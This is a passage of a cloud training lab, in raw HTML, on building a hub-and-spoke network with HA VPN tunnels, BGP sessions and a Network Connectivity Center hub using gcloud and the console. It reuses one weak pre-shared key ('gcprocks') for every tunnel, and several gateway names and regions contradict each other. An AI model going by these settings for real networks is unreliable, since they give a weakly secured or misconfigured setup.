role="presentation"><span role="presentation" style="padding-right: 0.1px;">gcloud compute vpn-gateways create vpc-transit-gw1-use4 \</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; --network=vpc-transit \</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; --region=us-west1 </span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">gcloud compute vpn-gateways create vpc-transit-gw1-usw2 \</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; --network=vpc-transit \</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; --region=us-central1</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">gcloud compute vpn-gateways create vpc-a-gw1-use4 \</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; --network=vpc-a \</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; --region=us-west1 </span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">gcloud compute vpn-gateways create vpc-b-gw1-usw2 \</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; --network=vpc-b \</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; --region=us-central1</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 383px;"></div><div class="CodeMirror-gutters" style="display: none; height: 383px;"></div></div></div></pre><p>&nbsp;</p><p><span>Click </span><em><span>Check my progress</span></em><span> to verify the objective.</span></p><p><span>Create cloud routers and HA VPN gateways</span></p><p>&nbsp;</p><p><span>Check my progress</span></p><p>&nbsp;</p><h5 id='step-3-create-a-pair-of-vpn-tunnels-between-vpc-transit-to-vpc-a'><strong><span>Step 3: Create a pair of VPN tunnels between vpc-transit to vpc-a</span></strong></h5><h6 id='add-vpn-tunnels-from-vpc-transit-to-vpc-a'><span>Add VPN tunnels from vpc-transit to vpc-a</span></h6><p><span>Create a pair of VPN tunnels using the following steps:</span></p><ol start='' ><li><p><span>From the VPN page, click on </span><strong><span>Cloud VPN Gateways</span></strong><span> and select </span><strong><span>vpc-transit-gw1-use4</span></strong><span>.</span></p></li><li><p><span>Click to </span><strong><span>Add VPN tunnel</span></strong><span>.</span></p></li><li><p><span>For the Peer VPN Gateway, select </span><strong><span>Google Cloud VPN Gateways</span></strong><span>.</span></p></li><li><p><span>Select the </span><strong><span>Project Id</span></strong><span> associated with the lab.</span></p></li><li><p><span>Select the remote VPN gateway, </span><strong><span>vpc-a-gw1-use4</span></strong><span>.</span></p></li><li><p><span>For high availability, select </span><strong><span>Create a pair of VPN tunnels</span></strong><span>.</span></p></li><li><p><span>Select the Cloud Router </span><strong><span>cr-vpc-transit-use4-1</span></strong><span>.</span></p></li><li><p><span>Click on the VPN tunnel to enter the tunnel details:</span></p><ul><li><p><span>The Cloud VPN and the associated peer VPN gateway interface information should be pre-populated</span></p></li><li><p><span>Name: </span><strong><span>transit-to-vpc-a-tu1</span></strong></p></li><li><p><span>IKE version: IKEv2</span></p></li><li><p><span>IKE pre-shared key: </span><strong><span>gcprocks</span></strong></p></li></ul></li><li><p><span>Click </span><strong><span>Done</span></strong><span>.</span></p></li><li><p><span>Repeat steps for the second tunnel:</span></p><ul><li><p><span>Name: </span><strong><span>transit-to-vpc-a-tu2</span></strong></p></li><li><p><span>IKE version: IKEv2</span></p></li><li><p><span>IKE pre-shared key: </span><strong><span>gcprocks</span></strong></p></li></ul></li><li><p><span>Click </span><strong><span>Done</span></strong><span>.</span></p></li><li><p><span>Click </span><strong><span>Create &amp; Continue</span></strong><span>.</span></p></li></ol><h6 id='add-bgp-sessions-for-each-vpn-tunnel-configured-from-vpc-transit-to-vpc-a'><span>Add BGP sessions for each VPN tunnel configured from vpc-transit to vpc-a</span></h6><p><span>The next step is to configure BGP session for the VPN tunnel </span><em><span>transit-to-vpc-a-tu1</span></em></p><ol start='' ><li><p><span>Click</span></p><p><span> </span></p><p><span>Configure BGP Session for transit-to-vpc-a-tu1</span></p><p><span>:</span></p><ul><li><p><span>BGP session name: </span><strong><span>transit-to-vpc-a-bgp1</span></strong></p></li><li><p><span>Peer ASN: </span><strong><span>65001</span></strong></p></li><li><p><span>Allocate BGP IPv4 address: </span><em><span>Manually</span></em></p></li><li><p><span>Cloud Router BGP IPv4 address: </span><strong><span>169.254.1.1</span></strong></p></li><li><p><span>BGP peer IPv4 address: </span><strong><span>169.254.1.2</span></strong></p></li></ul></li><li><p><span>Click </span><strong><span>Save and continue</span></strong><span>.</span></p></li></ol><ul><li><p><span>Repeat steps to configure BGP session for the VPN tunnel </span><em><span>transit-to-vpc-a-tu2</span></em><span>.</span></p></li></ul><ol start='' ><li><p><span>Click </span><strong><span>Configure BGP Session for transit-to-vpc-a-tu2</span></strong><span>:</span></p></li></ol><ul><li><p><span>BGP session name: </span><strong><span>transit-to-vpc-a-bgp2</span></strong></p></li><li><p><span>Peer ASN: </span><strong><span>65001</span></strong></p></li><li><p><span>Allocate BGP IPv4 address: </span><em><span>Manually</span></em></p></li><li><p><span>Cloud Router BGP IPv4 address: </span><strong><span>169.254.1.5</span></strong></p></li><li><p><span>BGP peer IPv4 address: </span><strong><span>169.254.1.6</span></strong></p></li></ul><ol start='' ><li><p><span>Click </span><strong><span>Save and continue</span></strong><span>.</span></p></li><li><p><span>Click on </span><strong><span>Save BGP configuration</span></strong><span>.</span></p></li><li><p><span>Click </span><strong><span>OK</span></strong><span>.</span></p></li></ol><h6 id='add-vpn-tunnels-from-vpc-a-to-vpc-transit'><span>Add VPN tunnels from vpc-a to vpc-transit</span></h6><p><span>Now create a pair of VPN tunnels from the </span><em><span>vpc-a</span></em><span> to </span><em><span>vpc-transit</span></em><span> to complete the bidirectional tunnel configuration using the following steps:</span></p><ol start='' ><li><p><span>From the VPN page, select </span><strong><span>Cloud VPN Gateways</span></strong><span> </span><em><span>vpc-a-gw1-use4</span></em><span>:</span></p></li><li><p><span>Click to </span><strong><span>Add VPN tunnel</span></strong><span>.</span></p></li><li><p><span>For the Peer VPN Gateway, select </span><strong><span>Google Cloud VPN Gateways</span></strong><span>.</span></p></li><li><p><span>Select the </span><strong><span>Project Id</span></strong><span> associated with the lab.</span></p></li><li><p><span>Select the remote VPN gateway, </span><strong><span>vpc-transit-gw1-use4</span></strong></p></li><li><p><span>For high availability, select </span><strong><span>Create a pair of VPN tunnels</span></strong><span>.</span></p></li><li><p><span>Select the Cloud Router, </span><strong><span>cr-vpc-a-use4-1</span></strong></p></li><li><p><span>Click on the VPN tunnel to enter the tunnel details:</span></p><ul><li><p><span>The Cloud VPN and peer VPN gateway interface information should be pre-populated.</span></p></li><li><p><span>Name: </span><strong><span>vpc-a-to-transit-tu1</span></strong></p></li><li><p><span>IKE version: IKEv2</span></p></li><li><p><span>IKE pre-shared key: </span><strong><span>gcprocks</span></strong></p></li></ul></li><li><p><span>Click </span><strong><span>Done</span></strong><span>.</span></p></li><li><p><span>Repeat steps for the second tunnel:</span></p><ul><li><p><span>Name: </span><strong><span>vpc-a-to-transit-tu2</span></strong></p></li><li><p><span>IKE version: IKEv2</span></p></li><li><p><span>IKE pre-shared key: </span><strong><span>gcprocks</span></strong></p></li></ul></li><li><p><span>Click </span><strong><span>Done</span></strong><span>.</span></p></li><li><p><span>Click </span><strong><span>Create &amp; Continue</span></strong><span>.</span></p></li></ol><h6 id='add-bgp-sessions-for-each-vpn-tunnel-configured-from-vpc-a-to-vpc-transit'><span>Add BGP sessions for each VPN tunnel configured from vpc-a to vpc-transit</span></h6><p><span>The next step is to configure BGP session for the VPN tunnel: </span><em><span>transit-to-vpc-a-tu1</span></em></p><ol start='' ><li><p><span>Click</span></p><p><span> </span></p><p><span>Configure BGP Session for vpc-a-to-transit-tu1</span></p><ul><li><p><span>BGP session name: </span><strong><span>vpc-a-to-transit-bgp1</span></strong></p></li><li><p><span>Peer ASN: </span><strong><span>65000</span></strong></p></li><li><p><span>Allocate BGP IPv4 address: </span><em><span>Manually</span></em></p></li><li><p><span>Cloud Router BGP IPv4 address: </span><strong><span>169.254.1.2</span></strong></p></li><li><p><span>BGP peer IPv4 address: </span><strong><span>169.254.1.1</span></strong></p></li></ul></li><li><p><span>Click </span><strong><span>Save and continue</span></strong><span>.</span></p></li></ol><p><span>Repeat steps to configure BGP session for the VPN tunnel: </span><em><span>transit-to-vpc-a-tu2</span></em></p><ol start='' ><li><p><span>Click</span></p><p><span> </span></p><p><span>Configure BGP Session for vpc-a-to-transit-tu2</span></p><ul><li><p><span>BGP session name: </span><strong><span>vpc-a-to-transit-bgp2</span></strong></p></li><li><p><span>Peer ASN: </span><strong><span>65000</span></strong></p></li><li><p><span>Allocate BGP IPv4 address: </span><em><span>Manually</span></em></p></li><li><p><span>Cloud Router BGP IPv4 address: </span><strong><span>169.254.1.6</span></strong></p></li><li><p><span>BGP peer IPv4 address: </span><strong><span>169.254.1.5</span></strong></p></li></ul></li><li><p><span>Click </span><strong><span>Save and continue</span></strong><span>.</span></p></li><li><p><span>Click on </span><strong><span>Save BGP configuration</span></strong><span>.</span></p></li><li><p><span>Click </span><strong><span>OK</span></strong><span>.</span></p></li></ol><p><span>Once this step is complete the VPN tunnel status should reflect </span><em><span>Established</span></em><span> and BGP status should reflect </span><em><span>BGP established</span></em><span>.</span></p><h5 id='step-4-create-a-pair-of-vpn-tunnels-between-vpc-transit-to-vpc-b'><strong><span>Step 4: Create a pair of VPN tunnels between vpc-transit to vpc-b</span></strong></h5><ul><li><p><span>Repeat steps listed above (step 3) to create the bidirectional HA VPN tunnels between the vpc-transit and vpc-b networks using the details below.</span></p></li></ul><h6 id='add-vpn-tunnels-from-vpc-transit-to-vpc-b'><span>Add VPN tunnels from vpc-transit to vpc-b</span></h6><figure class='table-figure'><table><thead><tr><th><span>Peer VPN gateway name</span></th><th><em><span>vpc-b-gw1-usw2</span></em></th></tr></thead><tbody><tr><td><span>Cloud Router</span></td><td><em><span>cr-vpc-transit-usw2-1</span></em></td></tr><tr><td><span>VPN tunnel one</span></td><td><em><span>transit-to-vpc-b-tu1</span></em></td></tr><tr><td><span>Pre-shared key</span></td><td><em><span>gcprocks</span></em></td></tr><tr><td><span>VPN tunnel two</span></td><td><em><span>transit-to-vpc-b-tu2</span></em></td></tr><tr><td><span>Pre-shared key</span></td><td><em><span>gcprocks</span></em></td></tr></tbody></table></figure><h6 id='add-bgp-sessions-for-each-vpn-tunnel-configured-from-vpc-transit-to-vpc-b'><span>Add BGP sessions for each VPN tunnel configured from vpc-transit to vpc-b</span></h6><p><span>BGP session for tunnel </span><em><span>transit-to-vpc-b-tu1</span></em><span> :</span></p><figure class='table-figure'><table><thead><tr><th><span>BGP session</span></th><th><em><span>transit-to-vpc-b-bgp1</span></em></th></tr></thead><tbody><tr><td><span>Peer ASN</span></td><td><em><span>65002</span></em></td></tr><tr><td><span>Cloud Router BGP IPv4 address</span></td><td><span>169.254.1.9</span></td></tr><tr><td><span>BGP peer IPv4 address</span></td><td><span>169.254.1.10</span></td></tr></tbody></table></figure><p><span>BGP session for tunnel </span><em><span>transit-to-vpc-b-tu2</span></em><span> :</span></p><figure class='table-figure'><table><thead><tr><th><span>BGP session</span></th><th><em><span>transit-to-vpc-b-bgp2</span></em></th></tr></thead><tbody><tr><td><span>Peer ASN</span></td><td><em><span>65002</span></em></td></tr><tr><td><span>Cloud Router BGP IPv4 address</span></td><td><span>169.254.1.13</span></td></tr><tr><td><span>BGP peer IPv4 address</span></td><td><span>169.254.1.14</span></td></tr></tbody></table></figure><h6 id='add-vpn-tunnels-from-vpc-b-to-vpc-transit'><span>Add VPN tunnels from vpc-b to vpc-transit</span></h6><figure class='table-figure'><table><thead><tr><th><span>Peer VPN gateway name</span></th><th><em><span>vpc-transit-gw1-usw2</span></em></th></tr></thead><tbody><tr><td><span>Cloud Router</span></td><td><em><span>cr-vpc-b-usw2-1</span></em></td></tr><tr><td><span>VPN tunnel one</span></td><td><em><span>vpc-b-to-transit-tu1</span></em></td></tr><tr><td><span>Pre-shared key</span></td><td><em><span>gcprocks</span></em></td></tr><tr><td><span>VPN tunnel second</span></td><td><em><span>vpc-b-to-transit-tu2</span></em></td></tr><tr><td><span>Pre-shared key</span></td><td><em><span>gcprocks</span></em></td></tr></tbody></table></figure><h6 id='add-bgp-sessions-for-each-vpn-tunnel-configured-from-vpc-b-to-vpc-transit'><span>Add BGP sessions for each VPN tunnel configured from vpc-b to vpc-transit</span></h6><p><span>BGP session for tunnel </span><em><span>vpc-b-to-transit-tu1</span></em><span> :</span></p><figure class='table-figure'><table><thead><tr><th><span>BGP session</span></th><th><em><span>vpc-b-to-transit-bgp1</span></em></th></tr></thead><tbody><tr><td><span>Peer ASN</span></td><td><em><span>65000</span></em></td></tr><tr><td><span>Cloud Router BGP IPv4 address</span></td><td><span>169.254.1.10</span></td></tr><tr><td><span>BGP peer IPv4 address</span></td><td><span>169.254.1.9</span></td></tr></tbody></table></figure><p><span>BGP session for tunnel </span><em><span>vpc-b-to-transit-tu2</span></em><span> :</span></p><figure class='table-figure'><table><thead><tr><th><span>BGP session</span></th><th><em><span>vpc-b-to-transit-bgp2</span></em></th></tr></thead><tbody><tr><td><span>Peer ASN</span></td><td><em><span>65000</span></em></td></tr><tr><td><span>Cloud Router BGP IPv4 address</span></td><td><span>169.254.1.14</span></td></tr><tr><td><span>BGP peer IPv4 address</span></td><td><span>169.254.1.13</span></td></tr></tbody></table></figure><h5 id='step-5-verify-the-all-the-vpn-connections-status-from-the-vpn-page'><strong><span>Step 5: Verify the all the VPN connections status from the VPN page</span></strong></h5><ul><li><p><span>Scroll down the page to confirm that all connections are good.</span></p></li></ul><p><img src="https://cdn.qwiklabs.com/QBF07Zii%2ByXoSqxQJHLbXtBlApXTpiIeZTYsGZVP1rU%3D" referrerpolicy="no-referrer" alt="VPN page with all VPN tunnel statuses displaying Established and Bgp session statuses displaying BGP established"></p><p><span>Click </span><em><span>Check my progress</span></em><span> to verify the objective.</span></p><p><span>Create a pair of VPN tunnels between vpc-transit to vpc-a and vpc-b</span></p><p>&nbsp;</p><p><span>Check my progress</span></p><p>&nbsp;</p><h4 id='task-4-create-ncc-hub-resources-and-attach-the-ha-vpns-as-spokes'><span>Task 4. Create NCC hub resources and attach the HA VPNs as spokes</span></h4><p><span>In this section you will create a VPC and create 2 subnets inside that VPC. This will all be done using gcloud CLI commands inside Google Cloud Shell.</span></p><p><span>Before you can perform any tasks for Network Connectivity Center, you must enable the Network Connectivity API.</span></p><ol start='' ><li><p><span>From the </span><strong><span>Navigation Menu</span></strong><span>, search for </span><strong><span>API &amp; Services</span></strong><span>.</span></p></li><li><p><span>Click on </span><strong><span>Library</span></strong><span>, and search for </span><strong><span>Network Connectivity API</span></strong><span>.</span></p></li><li><p><span>Select the </span><strong><span>Network Connectivity API</span></strong><span>.</span></p></li></ol><p><img src="images/hyB14LnLTAnovI6IC9wDMAoNbXT77qxEZyNIzXnww9Q%3D.png" referrerpolicy="no-referrer" alt="Network Connectivity API option highlighted in the search results"></p><ol start='' ><li><p><span>Click </span><strong><span>Enable</span></strong><span>.</span></p></li><li><p><span>In this lab </span><code>gcloud</code><span> commands are used to configure the Network Connectivity Center. In order to authorize Cloud Shell to run the gcloud commands, open the Google Cloud Shell by clicking </span><strong><span>Activate Cloud Shell</span></strong><span>(</span><img src="https://cdn.qwiklabs.com/ep8HmqYGdD%2FkUncAAYpV47OYoHwC8%2Bg0WK%2F8sidHquE%3D" referrerpolicy="no-referrer" alt="Activate Cloud Shell icon"><span>).</span></p></li><li><p><span>Run the following command to list the active account name:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">gcloud auth list</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p>&nbsp;</p><ol start='' ><li><p><span>Click </span><strong><span>Authorize</span></strong><span>.</span></p></li></ol><h5 id='step-1-create-ncc-hub'><span>Step 1: Create NCC hub</span></h5><ul><li><p><span>You can click on the &quot;clipboard&quot; icon in the upper right corner of the text box to copy the contents:</span></p></li></ul><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">gcloud alpha network-connectivity hubs create transit-hub \</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; --description=Transit_hub</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 45px;"></div><div class="CodeMirror-gutters" style="display: none; height: 45px;"></div></div></div></pre><p>&nbsp;</p><h5 id='step-2-create-the-spoke-for-branch-office-1'><span>Step 2: Create the spoke for branch office 1</span></h5><ul><li><p><span>You can click on the &quot;clipboard&quot; icon in the upper right corner of the text box to copy the contents:</span></p></li></ul><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation" style=""><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">gcloud alpha network-connectivity spokes create bo1 \</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;  --hub=transit-hub \</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;  --description=branch_office1 \</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;  --vpn-tunnel=transit-to-vpc-a-tu1,transit-to-vpc-a-tu2 \</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;  --region=us-central1</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 113px;"></div><div class="CodeMirror-gutters" style="display: none; height: 113px;"></div></div></div></pre><p>&nbsp;</p><h5 id='step-3-create-the-spoke-for-branch-office-2'><span>Step 3: Create the spoke for branch office 2</span></h5><ul><li><p><span>You can click on the &quot;clipboard&quot; icon in the upper right corner of the text box to copy the contents.</span></p></li></ul><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation" style=""><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">gcloud alpha network-connectivity spokes create bo2 \</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;  --hub=transit-hub \</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;  --description=branch_office2 \</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;  --vpn-tunnel=transit-to-vpc-b-tu1,transit-to-vpc-b-tu2 \</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;  --region=us-west2</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 113px;"></div><div class="CodeMirror-gutters" style="display: none; height: 113px;"></div></div></div></pre><p>&nbsp;</p><p><span>Click </span><em><span>Check my progress</span></em><span> to verify the objective.</span></p><p><span>Create NCC hub resources and attach the HA VPNs as spokes</span></p><p>&nbsp;</p><p><span>Check my progress</span></p><p>&nbsp;</p><h4 id='task-5-test-the-setup-end-to-end-deploying-vms-in-the-remote-branch-office-vpcs'><span>Task 5. Test the setup end to end deploying VMs in the remote branch office VPCs</span></h4><p><span>After configuring the hub and its spokes, you should be able to pass traffic from the virtual machine (VM) instance in </span><em><span>branch office1</span></em><span> to the VM instance in </span><em><span>branch office2</span></em><span>. To do this, create a </span><em><span>vpc-a-vm-1</span></em><span> in </span><em><span>vpc-a</span></em><span> and vpc-b-vm-1 in </span><em><span>vpc-b</span></em><span> respectively.</span></p><p><span>First, create firewall rules: </span><em><span>fw-a</span></em><span> for </span><em><span>vpc-a-vm-1</span></em><span> in </span><em><span>vpc-a-sub1-use4</span></em><span> subnet and </span><em><span>fw-b</span></em><span> for </span><em><span>vpc-b-vm-1</span></em><span> in </span><em><span>vpc-b-sub1-usw2</span></em><span> subnet respectively to allow ingress SSH and ICMP traffic.</span></p><p><img src="images/o5dZVa%2Byv8W3ZZA%2F44UUwlMUXClCGuSQhpERepDFpGI%3D.png" referrerpolicy="no-referrer" alt="Network topology project screen"></p><h5 id='step-1-create-firewall-rule-for-vpc-a'><span>Step 1: Create Firewall rule for vpc-a</span></h5><ol start='' ><li><p><span>In the Cloud Platform Console, click </span><strong><span>Navigation menu</span></strong><span> (</span><img src="https://cdn.qwiklabs.com/tkgw1TDgj4Q%2BYKQUW4jUFd0O5OEKlUMBRYbhlCrF0WY%3D" referrerpolicy="no-referrer" alt="Navigation menu icon"><span>) at the top left of the screen.</span></p></li><li><p><span>Then navigate to </span><strong><span>VPC network</span></strong><span> &gt; </span><strong><span>Firewall</span></strong><span>.</span></p></li><li><p><span>Click on </span><strong><span>CREATE FIREWALL RULE</span></strong><span> and specify the details as shown.</span></p></li></ol><p><img src="images/zau55jMGfANEcN6iYWMuSz8iCdjBuUPyY4yr9dbi2wA%3D.png" referrerpolicy="no-referrer" alt="Firewall Rule Creation"><span> </span><img src="images/sYV7SXfm3cPA1o%2BCqRqq%2BYnJ%2FvWaFhMl03VXNFETmMk%3D.png" referrerpolicy="no-referrer" alt="Firewall Rule Creation"></p><ol start='' ><li><p><span>Similarly, create firewall rule </span><strong><span>fw-b</span></strong><span> for </span><strong><span>vpc-b</span></strong><span>.</span></p></li></ol><h5 id='step-2-create-vm-in-vpc-a'><span>Step 2: Create VM in vpc-a</span></h5><ol start='' ><li><p><span>In the </span><strong><span>Cloud console</span></strong><span>, on the </span><strong><span>Navigation menu</span></strong><span> (☰), click </span><strong><span>Compute Engine</span></strong><span> &gt; </span><strong><span>VM Instances</span></strong><span>, then click </span><strong><span>Create instance</span></strong><span>.</span></p></li></ol><p><strong><span>Note:</span></strong><span> This may take a minute to initialize for the first time.</span></p><p><span>There are many parameters you can configure when creating a new instance. Use the following for this lab:</span></p><ol start='' ><li><p><span>In the </span><strong><span>Machine configuration</span></strong></p><p><span>Enter the values for the following fields:</span></p><figure class='table-figure'><table><thead><tr><th style='text-align:left;' ><span>Field</span></th><th style='text-align:left;' ><span>Value</span></th></tr></thead><tbody><tr><td style='text-align:left;' ><strong><span>Name</span></strong></td><td style='text-align:left;' ><code>vpc-a-vm-1</code></td></tr><tr><td style='text-align:left;' ><strong><span>Region</span></strong></td><td style='text-align:left;' ><code>us-central1</code></td></tr><tr><td style='text-align:left;' ><strong><span>Zone</span></strong></td><td style='text-align:left;' ><code>us-central1-c</code></td></tr><tr><td style='text-align:left;' ><strong><span>Series</span></strong></td><td style='text-align:left;' ><code>E2</code></td></tr><tr><td style='text-align:left;' ><strong><span>Machine</span></strong></td><td style='text-align:left;' ><code>e2-medium</code></td></tr></tbody></table></figure></li><li><p><span>Click </span><strong><span>OS and storage</span></strong></p><p><span>Click </span><strong><span>Change</span></strong><span> to begin configuring your boot disk and select the values for:</span></p><figure class='table-figure'><table><thead><tr><th style='text-align:left;' ><span>Field</span></th><th style='text-align:left;' ><span>Value</span></th></tr></thead><tbody><tr><td style='text-align:left;' ><strong><span>Operating system</span></strong></td><td style='text-align:left;' ><code>Debian</code></td></tr><tr><td style='text-align:left;' ><strong><span>Version</span></strong></td><td style='text-align:left;' ><code>Debian GNU/Linux 11 (bullseye) x86/64</code></td></tr><tr><td style='text-align:left;' ><strong><span>Boot disk type</span></strong></td><td style='text-align:left;' ><code>balanced persistent disk</code></td></tr><tr><td style='text-align:left;' ><strong><span>Size (GB)</span></strong></td><td style='text-align:left;' ><code>10 